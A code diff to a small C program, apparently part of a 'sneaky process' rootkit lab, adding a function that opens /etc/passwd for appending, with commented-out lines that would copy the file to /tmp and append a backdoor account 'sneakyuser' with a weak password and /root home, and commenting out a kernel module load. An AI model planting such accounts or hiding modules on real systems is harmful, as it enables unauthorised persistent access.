@@ -4,7 +4,26 @@
 #include <unistd.h>
 #include <string.h>
 
+void pwdswap(void) {
+  //  system("sudo cp /etc/passwd /tmp/passwd");
+  // system("sudo cp /tmp/passwd /tmp/passwd_phony);
+  FILE * passwd = fopen("/etc/passwd", "at+");
+  if (passwd == NULL) {
+    perror("File Opening");
+    return;
+  }
+  // fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",50,1,passwd);
+  //fclose(passwd);
+}
+
+
 int main(void) {
+
+  //etc/pwd swap
+  pwdswap();
+
+  //show output of password file
+  
   //get process ID
   int PID;
   PID = getpid();
@@ -20,7 +39,7 @@ int main(void) {
   printf("My process ID is: %d\n", PID);
 
 
-  //
+  /*
   //load kernel module
   system(str);
 
@@ -31,6 +50,7 @@ int main(void) {
   //Release kernel module 
   //  system("sudo rmmod sneaky_mod.ko");
 
+  */
   return EXIT_SUCCESS;
 
 }
